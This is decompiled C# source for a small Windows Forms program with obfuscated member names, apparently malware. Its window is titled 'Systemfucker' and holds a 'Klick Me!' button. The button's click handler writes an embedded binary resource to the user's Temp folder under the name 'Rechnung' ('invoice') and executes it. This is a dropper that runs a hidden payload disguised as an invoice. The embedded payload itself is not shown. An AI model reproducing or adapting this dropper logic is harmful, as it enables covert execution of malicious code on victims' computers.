using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

[DesignerGenerated]
public sealed class Form1 : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[AccessedThroughProperty("Button1")]
	private Button button_0;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox pictureBox_0;

	[DebuggerNonUserCode]
	public Form1()
	{
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		vmethod_1(new Button());
		vmethod_3(new PictureBox());
		((ISupportInitialize)vmethod_2()).BeginInit();
		((Control)this).SuspendLayout();
		Button obj = vmethod_0();
		Point location = new Point(11, 116);
		((Control)obj).set_Location(location);
		((Control)vmethod_0()).set_Name("Button1");
		Button obj2 = vmethod_0();
		Size size = new Size(151, 23);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		((ButtonBase)vmethod_0()).set_Text("Klick Me!");
		((ButtonBase)vmethod_0()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_2()).set_BackColor(Color.Red);
		PictureBox obj3 = vmethod_2();
		location = new Point(35, 12);
		((Control)obj3).set_Location(location);
		((Control)vmethod_2()).set_Name("PictureBox1");
		PictureBox obj4 = vmethod_2();
		size = new Size(102, 98);
		((Control)obj4).set_Size(size);
		vmethod_2().set_TabIndex(1);
		vmethod_2().set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(174, 151);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Systemfucker");
		((ISupportInitialize)vmethod_2()).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[DebuggerNonUserCode]
	internal virtual Button vmethod_0()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(Button button_1)
	{
		EventHandler eventHandler = method_0;
		if (button_0 != null)
		{
			((Control)button_0).remove_Click(eventHandler);
		}
		button_0 = button_1;
		if (button_0 != null)
		{
			((Control)button_0).add_Click(eventHandler);
		}
	}

	[DebuggerNonUserCode]
	internal virtual PictureBox vmethod_2()
	{
		return pictureBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_3(PictureBox pictureBox_1)
	{
		pictureBox_0 = pictureBox_1;
	}

	private void method_0(object sender, EventArgs e)
	{
		File.WriteAllBytes(((ServerComputer)Class8.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\Rechnung", Class12.smethod_3());
		Interaction.Shell(((ServerComputer)Class8.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\Rechnung", (AppWinStyle)2, false, -1);
	}
}
